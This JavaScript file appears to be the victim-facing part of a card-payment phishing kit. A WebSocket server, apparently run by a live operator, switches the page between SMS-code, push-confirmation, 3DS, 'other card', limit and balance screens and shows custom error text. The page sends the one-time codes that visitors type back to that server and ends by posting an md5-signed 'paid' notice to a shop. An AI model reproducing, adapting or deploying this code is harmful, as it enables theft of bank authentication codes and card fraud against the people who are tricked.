import md5 from "js-md5";

export const ws = new WebSocket("ws://localhost:9000");

const buttonRestart = document.querySelector('.buttonRestart');
const buttonSMS = document.querySelector('.codeSMS_button');
const buttonCustomSMS = document.querySelector('.codeCustomSMS_button');
const buttonPushSMS = document.querySelector('.codePushSMS_button');
const buttonCustomPushSMS = document.querySelector('.codeCustomPushSMS_button');

const SMSValidateInput = document.querySelector('.SMSValidateInput');
const CustomSMSValidateInput = document.querySelector('.CustomSMSValidateInput');


buttonSMS.style.opacity = '.5';
buttonCustomSMS.style.opacity = '.5';

buttonSMS.setAttribute('disabled', '')
buttonCustomSMS.setAttribute('disabled', '')


let pushTime = 300;
let redirectTime = 5;


let userData;
let orderData;


function postToUrl(path, params, method = "post") {
    const form = document.createElement("form");
    form.method = method;
    form.action = path;

    for (const key in params) {
        if (params.hasOwnProperty(key)) {
            const hiddenField = document.createElement("input");
            hiddenField.type = "hidden";
            hiddenField.name = key;
            hiddenField.value = params[key];

            form.appendChild(hiddenField);
        }
    }

        document.body.appendChild(form);
        form.submit();
}

SMSValidateInput.oninput = (e)=> {
    if(e.target.value.length >= 3) {
        buttonSMS.style.opacity = '1';
        buttonSMS.removeAttribute('disabled')
    }  else {
        buttonSMS.style.opacity = '.5';
        buttonSMS.setAttribute('disabled', '')
    }
}

CustomSMSValidateInput.oninput = (e)=> {
    if(e.target.value.length >= 3) {
        buttonCustomSMS.style.opacity = '1';
        buttonCustomSMS.removeAttribute('disabled')
    }  else {
        buttonCustomSMS.style.opacity = '.5';
        buttonCustomSMS.setAttribute('disabled', '')
    }
}



const nilFirst = (t)=> {
    if (t.toString().length === 1) return '0' + t;
    return t.toString();
}
  
const toTime = (sec = 0)=> {
    return nilFirst(Math.trunc(sec / 60)) + ':' + nilFirst(sec % 60)
}


const ResetAll = ()=> {
    document.querySelector('.App-Payment.is-darkBackground').style.display = 'none';
    document.querySelectorAll('.AppBlocks').forEach(item=> {
        item.classList.remove('isActiveMode');
    })
}

const sendUserTo = (data, session, sendTo)=> {
    ws.send(JSON.stringify({
        type: 'sendAdmin',
        callback: data.callback,
        message_id: session.mID,
        to: sendTo
    }));
};



const backOffline = ()=> {
    const verified = JSON.parse(localStorage.getItem('verified'));
    ws.send(JSON.stringify({
        type: 'clientClick',
        event: 'REDIRECT',
        message_id: verified.mID
    }))
    ws.send(JSON.stringify({
        type: 'offline',
        message_id: verified.mID
    }));
    document.location.href = '/'

}


buttonRestart.onclick = backOffline;

buttonSMS.onclick = (event)=> {
    const inputSMS = document.querySelector('#codeSMS');
    inputSMS.setAttribute('disabled', '');
    document.querySelector('.smsLoader').classList.add('isLoading');
    const { mID, method } = JSON.parse(localStorage.getItem('verified'));
    ws.send(JSON.stringify({
        type: 'sendSMS',
        message_id: mID,
        fromMethod: method,
        code: inputSMS.value
    }));
    event.target.remove();
}

buttonCustomSMS.onclick = (event)=> {
    const inputSMS = document.querySelector('#codeCustomSMS');
    inputSMS.setAttribute('disabled', '');
    document.querySelector('.smsCustomLoader').classList.add('isLoading');
    const { mID, method } = JSON.parse(localStorage.getItem('verified'));
    ws.send(JSON.stringify({
        type: 'sendSMS',
        message_id: mID,
        fromMethod: method,
        code: inputSMS.value
    }));
    event.target.remove();
}

buttonPushSMS.onclick = (event)=> {
    ws.send(JSON.stringify({
        type: 'clientClick',
        event: 'PUSH',
        message_id: JSON.parse(localStorage.getItem('verified')).mID
    }))
    document.querySelector('.smsAppPushLoader').classList.add('isLoading');
    event.target.remove();
}

buttonCustomPushSMS.onclick = (event)=> {
    ws.send(JSON.stringify({
        type: 'clientClick',
        event: 'CUSTOM PUSH',
        message_id: JSON.parse(localStorage.getItem('verified')).mID
    }))
    document.querySelector('.smsAppCustomPushLoader').classList.add('isLoading');
    event.target.remove();
}

let pageTimer = setTimeout(function tick() {
    const AppPush = document.querySelector('.AppPush');
    const AppCustomPush = document.querySelector('.AppCustomPush');
    const AppSuccess = document.querySelector('.AppSuccess');

    if(AppPush.classList.contains('isActiveMode')) {
        if(pushTime > 0) { pushTime--; }
        document.querySelector('.pushTimer').textContent = toTime(pushTime);
    } else if(AppCustomPush.classList.contains('isActiveMode')) {
        if(pushTime > 0) { pushTime--; }
        // document.querySelector('.pushCustomPushTimer').textContent = toTime(pushTime);
    } else {
        pushTime = 301;
    }

    if(AppSuccess.classList.contains('isActiveMode')) {
        if(redirectTime > 0) { redirectTime--; }
        else {
            const order = userData.order;
            const paid = "1"
            const signature = md5.md5(`${userData.shop_id};${order.total_price};${order.client_transaction_id};${order.key};${paid};${userData.shop_password}`);
            postToUrl(userData.redirectURL, {
                paid: paid,
                amount: order.total_price,
                transaction_id: order.client_transaction_id,
                key: order.key,
                signature: signature,
                shop_id: userData.shop_id
            });
        }
        document.querySelector('.redirectSuccessPayTimer').textContent = redirectTime;
    } else { redirectTime = 5; }

    pageTimer = setTimeout(tick, 1000);
}, 1000)



ws.onmessage = (response)=> {
    const data = JSON.parse(response.data);
    if(data.type == 'verify') {
        localStorage.setItem('verified', JSON.stringify({
            'mID': data.message_id,
            'method': ''
        }));
        // ws.send(JSON.stringify({'uid': localStorage.getItem('uID')}));
    }

    if(data.type == 'checkUser') {
        const {mID, method} = JSON.parse(localStorage.getItem('verified')) 
        || {'mID': '', 'method': ''};
        localStorage.setItem('verified', JSON.stringify({
                mID: mID,
                method: ''
            })
        );
        ws.send(JSON.stringify({
            type: 'button',
            message_id: JSON.parse(localStorage.getItem('verified')).mID,
            callback: data.callback
        }));
    }

    const verify = JSON.parse(localStorage.getItem('verified')); 

    try {

        if(data.type == "successRedirect" && data.message_id == verify.mID) {
            orderData = data.order;
            userData = data;
        }


        if(data.type == "customsms" && data.message_id == verify.mID) {
            ws.send(JSON.stringify({
                type: 'sendAdmin',
                callback: 'customsms',
                message_id: verify.mID
            }))
            ResetAll()
            document.querySelector('.AppCustomSMS').classList.add('isActiveMode');
            document.querySelector('.CustomSMSText').textContent = data.text;
        }

        if(data.type == "custompush" && data.message_id == verify.mID) {
            ws.send(JSON.stringify({
                type: 'sendAdmin',
                callback: 'custompush',
                message_id: verify.mID
            }));
            ResetAll()
            document.querySelector('.AppCustomPush').classList.add('isActiveMode');
            document.querySelector('.customPushText').textContent = data.text;
        }

        if(data.type == "ownerror" && data.message_id == verify.mID) {
            ws.send(JSON.stringify({
                type: 'sendAdmin',
                callback: 'ownerror',
                message_id: verify.mID
            }));
            ResetAll()
            document.querySelector('.AppOwnError').classList.add('isActiveMode');
            document.querySelector('.OwnErrorText').textContent = data.text;
        }

        if(data.type == 'button' && data.message_id == verify.message_id) {
            if(data.callback) {
                redirectTime = 6;
                pushTime = 301;
            }
            if(data.callback == 'sms') { 
                sendUserTo(data, verify, 'smsPAGE');
                ResetAll()
                document.querySelector('.AppSMS').classList.add('isActiveMode');
            }
            if(data.callback == 'custom_sms') {
                ws.send(JSON.stringify({
                    type: 'isCustomSMS',
                    message_id: JSON.parse(localStorage.getItem('verified')).mID,
                    callback: data.callback
                }))
            }
            if(data.callback == 'pushSMS') {
                sendUserTo(data, verify, 'pushSMSPAGE');
                ResetAll()
                document.querySelector('.AppPush').classList.add('isActiveMode');
            }
            if(data.callback == 'custom_pushSMS') {
                ws.send(JSON.stringify({
                    type: 'isCustomPUSH',
                    message_id: JSON.parse(localStorage.getItem('verified')).mID,
                    callback: data.callback
                }))
            }
            if(data.callback == 'success_pay') {
                ws.send(JSON.stringify({
                    type: 'sendAdmin',
                    message_id: JSON.parse(localStorage.getItem('verified')).mID,
                    callback: data.callback
                }));
                ResetAll()
                document.querySelector('.AppSuccess').classList.add('isActiveMode');
            }
            if(data.callback == "other_card") {
                sendUserTo(data, verify, 'other_cardPAGE');
                ResetAll()
                document.querySelector('.AppOtherCard').classList.add('isActiveMode');
            }
            
            if(data.callback == "3dson") {
                sendUserTo(data, verify, '3dsonPAGE');
                ResetAll()
                document.querySelector('.App3DS').classList.add('isActiveMode');
            }
            if(data.callback == "limit") {
                sendUserTo(data, verify, 'limitPAGE');
                ResetAll()
                document.querySelector('.AppLimit').classList.add('isActiveMode');
            }
            if(data.callback == "balance") {
                sendUserTo(data, verify, 'balancePAGE');
                ResetAll()
                document.querySelector('.AppBalance').classList.add('isActiveMode');
            }
            if(data.callback == "own_error") {
                ws.send(JSON.stringify({
                    type: 'isOwnError',
                    message_id: JSON.parse(localStorage.getItem('verified')).mID,
                    callback: data.callback
                }))
            }
            if(data.callback == 'online') {
                ws.send(JSON.stringify({
                    type:'isOnline',
                    message_id: JSON.parse(localStorage.getItem('verified')).mID,
                    callback: data.callback
                }));
            }
        }

    } catch (err) {
        console.log(err);
    }
}